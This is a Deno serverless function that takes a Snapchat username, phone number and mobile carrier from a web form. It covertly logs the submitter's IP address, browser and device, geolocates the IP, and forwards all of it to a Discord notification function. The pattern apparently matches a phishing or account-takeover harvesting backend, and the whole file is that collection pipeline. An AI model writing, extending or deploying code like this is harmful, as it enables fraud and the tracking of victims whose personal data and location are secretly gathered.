import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

Deno.serve(async (req) => {
  try {
    const base44 = createClientFromRequest(req);
    const { snapchat, telephone, operateur } = await req.json();

    if (!snapchat || !telephone || !operateur) {
      return Response.json({ error: 'Données manquantes' }, { status: 400 });
    }

    // Extract client IP
    let ip = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
             req.headers.get('x-real-ip') ||
             req.headers.get('cf-connecting-ip') ||
             req.headers.get('x-client-ip') ||
             'unknown';
    ip = ip.trim();

    // Extract browser and device from user-agent
    const userAgent = req.headers.get('user-agent') || '';
    let browser = 'Inconnu';
    let device = '💻 PC';

    if (userAgent.includes('Edg/')) browser = 'Edge';
    else if (userAgent.includes('Chrome')) browser = 'Chrome';
    else if (userAgent.includes('Firefox')) browser = 'Firefox';
    else if (userAgent.includes('Safari')) browser = 'Safari';

    if (userAgent.includes('Mobile') || userAgent.includes('Android')) device = '📱 Téléphone';
    else if (userAgent.includes('iPad')) device = '📱 Tablette';

    // Create submission immediately — don't wait for geo/Discord
    const submission = await base44.asServiceRole.entities.Submission.create({
      snapchat,
      telephone,
      operateur,
      status: 'pending',
      ip_address: ip,
      browser,
    });

    // Fire geo + Discord notification in background (non-blocking)
    (async () => {
      let country = 'Inconnue';
      let city = 'Inconnue';
      try {
        const geoRes = await base44.functions.invoke('geolocateIP', { ip });
        if (geoRes?.data) {
          country = geoRes.data.country || 'Inconnue';
          city = geoRes.data.city || 'Inconnue';
        }
      } catch (e) {
        console.error('geolocateIP error:', e.message);
      }

      await base44.asServiceRole.entities.Submission.update(submission.id, { country });

      await base44.functions.invoke('notifyDiscord', {
        snapchat,
        telephone,
        operateur,
        submissionId: submission.id,
        ip,
        country,
        city,
        browser,
        device
      }).catch(() => {});
    })();

    return Response.json({ ok: true, submissionId: submission.id });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
});